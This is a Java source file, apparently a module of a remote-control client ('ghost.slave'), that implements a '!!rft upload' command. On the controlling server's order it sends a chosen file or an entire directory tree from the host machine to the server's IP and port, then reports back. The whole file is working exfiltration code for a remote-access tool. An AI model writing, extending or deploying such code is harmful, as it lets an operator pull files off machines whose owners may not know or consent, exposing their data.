package top.idoknow.ghost.slave.func;

import com.rft.core.client.FileSender;
import top.idoknow.ghost.slave.cmd.AbstractFunc;
import top.idoknow.ghost.slave.cmd.AbstractProcessor;
import top.idoknow.ghost.slave.conn.HandleConn;
import top.idoknow.ghost.slave.core.ClientMain;

import java.io.File;
import java.util.Date;

public class FuncRFT implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!rft";
	}

	@Override
	public String[] getParamsModel() {
		return new String[]{"<oper>","[params]"};
	}

	@Override
	public String getDescription() {
		return "调用rft功能";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		switch (params[0]){
			case "upload":{
				if(params.length<3){
					HandleConn.writeToServerIgnoreException("命令语法不正确");
					break;
				}
				try {
					File source=new File(params[1].replaceAll("\\?"," ").replaceAll("\\*","!"));
					if (source.isFile()){
						FileSender.sendFileMethod(source,params[2],new Date().getTime()+"",HandleConn.ip,HandleConn.rft_port);
					}else if (source.isDirectory()){
						UploadDir(source,params[2]+"/"+source.getName(),HandleConn.ip,HandleConn.rft_port);
					}
				} catch (Exception e) {
					e.printStackTrace();
					HandleConn.writeToServerIgnoreException("上传出错"+ ClientMain.getErrorInfo(e)+"\n");
				}
				break;
			}
			default:{
				HandleConn.writeToServerIgnoreException("命令语法不正确");
				break;
			}
		}
		HandleConn.sendFinishToServer();
	}
	private void UploadDir(File dirFile,String remotePath,String ip,int port){
		File[] files=dirFile.listFiles();
		for (File file:files){
			if (file.isFile()){
				FileSender.sendFile(file,remotePath, file.getName(), ip,port);
			}else if (file.isDirectory()){
				UploadDir(file,remotePath+"/"+file.getName(),ip,port);
			}
		}
	}
}
